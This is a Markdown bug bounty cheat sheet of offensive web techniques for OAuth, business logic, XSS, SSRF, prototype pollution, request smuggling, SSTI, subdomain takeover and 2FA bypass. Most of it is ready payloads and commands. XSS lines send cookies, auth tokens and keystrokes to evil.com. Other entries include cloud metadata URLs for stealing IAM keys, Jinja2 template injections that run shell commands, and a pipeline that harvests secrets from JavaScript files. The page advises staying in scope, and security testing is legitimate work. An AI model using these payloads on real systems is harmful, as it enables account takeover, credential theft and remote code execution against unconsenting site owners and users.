# Advanced Techniques & Extra Knowledge - Bug Bounty Hunter Guide

## OAuth 2.0 Attack Vectors

### Common Misconfigurations
```
1. Open Redirect in redirect_uri
   → redirect_uri=https://target.com/callback/../../../evil.com
   → Steal authorization code

2. State Parameter Missing → CSRF on OAuth flow

3. Token Leakage in Referer
   → Token in URL → sent in Referer header to 3rd party

4. Authorization Code Reuse
   → Use same code twice → if works = vulnerable

5. Scope Manipulation
   → scope=email → scope=email admin profile

6. PKCE Bypass
   → Intercept code → use without code_verifier
```

### OAuth Account Takeover Chain
```
1. Find OAuth login with Google/Facebook
2. Check if redirect_uri validated strictly
3. Find open redirect on same domain
4. Chain: OAuth → redirect to open redirect → steal token
= Full account takeover!
```

---

## Business Logic Vulnerabilities

### Price/Value Manipulation
```
- Negative quantities: qty=-1 → credit instead of charge
- Integer overflow: 9999999 → wraps to 0 or negative
- Currency confusion: $1 USD vs $1 BTC
- Discount stacking: apply same coupon multiple times
- Race condition: buy item while cancelling payment
```

### Workflow Bypass
```
- Skip steps: /checkout/step1 → /checkout/complete (skip payment)
- Force browse: access paid features without paying
- Parameter tampering: plan=free → plan=premium
- Cookie manipulation: role=user → role=admin
```

### Time-Based Logic
```
- Expired tokens still valid
- Event tickets usable after event date
- Trial periods: manipulate created_at date
- Coupon codes not expiring
```

---

## Advanced XSS Techniques

### XSS to Account Takeover
```javascript
// Steal session cookie
fetch('https://evil.com/?c='+document.cookie)

// Steal localStorage token  
fetch('https://evil.com/?t='+localStorage.getItem('auth_token'))

// Keylogger
document.addEventListener('keypress', e => {
  fetch('https://evil.com/?k='+e.key)
})

// Capture password on re-auth prompt
document.body.innerHTML += '<form action="https://evil.com/steal">Password:<input name="p"><button>Confirm</button></form>'
```

### Blind XSS Payloads
```html
<script src="https://YOUR-XSSHUNTER.xss.ht"></script>
"><script src="https://YOUR-XSSHUNTER.xss.ht"></script>
```
- Use: XSSHunter, Interactsh, Canarytokens
- Target: support tickets, admin panels, logs

### CSP Bypass
```javascript
// JSONP endpoint bypass
<script src="https://target.com/jsonp?callback=alert(1)//"></script>

// Angular sandbox escape (older versions)
{{constructor.constructor('alert(1)')()}}

// Via open redirect + script src
<script src="https://target.com/redirect?url=//evil.com/xss.js"></script>
```

---

## SSRF Advanced Payloads

### Cloud Metadata Endpoints
```
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:   http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Get AWS keys:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### SSRF Bypass Techniques
```
http://127.0.0.1/          → http://2130706433/ (decimal IP)
http://localhost/           → http://[::1]/  (IPv6)
http://127.0.0.1/          → http://127.1/ (short form)
https://evil.com → http:// → DNS rebinding attack
```

### SSRF to RCE Chain
```
SSRF → internal Redis → set cron → RCE
SSRF → internal Jenkins → execute build → RCE  
SSRF → AWS metadata → get IAM keys → AWS takeover
```

---

## Prototype Pollution

### Detection
```javascript
// In URL params
?__proto__[polluted]=true
?constructor[prototype][polluted]=true

// In JSON body
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}

// Check: Object.prototype.polluted → "true" = vulnerable
```

### Prototype Pollution to XSS
```javascript
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=//evil.com/xss.js
```

---

## HTTP Request Smuggling

### CL.TE (Frontend=Content-Length, Backend=Transfer-Encoding)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Detection
- Burp Suite HTTP Request Smuggler extension
- `smuggler.py` tool
- Look for: time delays, unexpected responses

---

## SSTI (Server-Side Template Injection)

### Detection Payloads
```
{{7*7}} → 49         (Jinja2, Twig)
${7*7}  → 49         (Freemarker, Groovy)  
<%= 7*7 %> → 49      (ERB/Ruby)
#{7*7}  → 49         (Ruby)
```

### SSTI to RCE (Jinja2)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

---

## Subdomain Takeover Quick Reference

### Vulnerable CNAME Targets
| Service | Fingerprint |
|---------|------------|
| GitHub Pages | `There isn't a GitHub Pages site here` |
| Heroku | `No such app` |
| AWS S3 | `NoSuchBucket` |
| Shopify | `Sorry, this shop is currently unavailable` |
| Fastly | `Fastly error: unknown domain` |
| Azure | `404 Web Site not found` |

### Takeover Process
```bash
1. subfinder -d target.com | httpx -silent | nuclei -t takeovers/
2. Find dangling CNAME: dig CNAME sub.target.com
3. Register the pointed service with same name
4. Confirm: your content appears on sub.target.com
```

---

## 2FA/MFA Bypass Techniques

```
1. Response manipulation:
   "success": false → "success": true
   "otp_required": true → "otp_required": false

2. OTP brute force:
   6-digit = 1,000,000 combinations
   No rate limit? → Burp Intruder, 000000-999999

3. Reuse previous OTP:
   OTP not invalidated after use

4. Skip 2FA step:
   After /login/step1 → go directly to /dashboard
   
5. Backup codes:
   Predictable backup codes
   Backup codes work after 2FA setup change

6. Race condition:
   Submit 2FA simultaneously → one succeeds
```

---

## Useful One-Liners

```bash
# Find all subdomains + check alive + screenshot
subfinder -d target.com | httpx -silent | tee alive.txt | gowitness scan -f -

# Find exposed .git directories  
ffuf -w domains.txt -u https://FUZZ/.git/HEAD -mc 200

# Find secrets in JS files
cat js_files.txt | xargs -I{} sh -c 'curl -s {} | grep -Eo "(api_key|apikey|secret|password|token)['\''\":\s]+[a-zA-Z0-9_\-]+"'

# Quick SSRF test with interactsh
ffuf -w params.txt -u "https://target.com/page?FUZZ=http://YOUR.interactsh.com"

# SQLi quick test
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2 --dbs

# Nuclei full scan
nuclei -u https://target.com -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -o results.txt
```

---

## Bug Bounty Platform Tips

### HackerOne / Bugcrowd
- Read scope CAREFULLY before testing
- Check for wildcard: `*.target.com` = all subdomains in scope
- Out of scope: never test out of scope
- CVSS score yourself honestly
- Duplicates: use `--resolve` to check if already reported

### Writing Winning Reports
- Clear title with impact: "IDOR in /api/users/{id} allows reading any user's PII"
- Always include: steps, impact, PoC, fix
- Video PoC for complex bugs
- Suggest fix = faster triage = faster bounty

### Triage Tips  
- Respond quickly to triager questions
- Be professional always
- If closed unfairly: appeal with more evidence
- Learn from closed reports: why was it low/info?
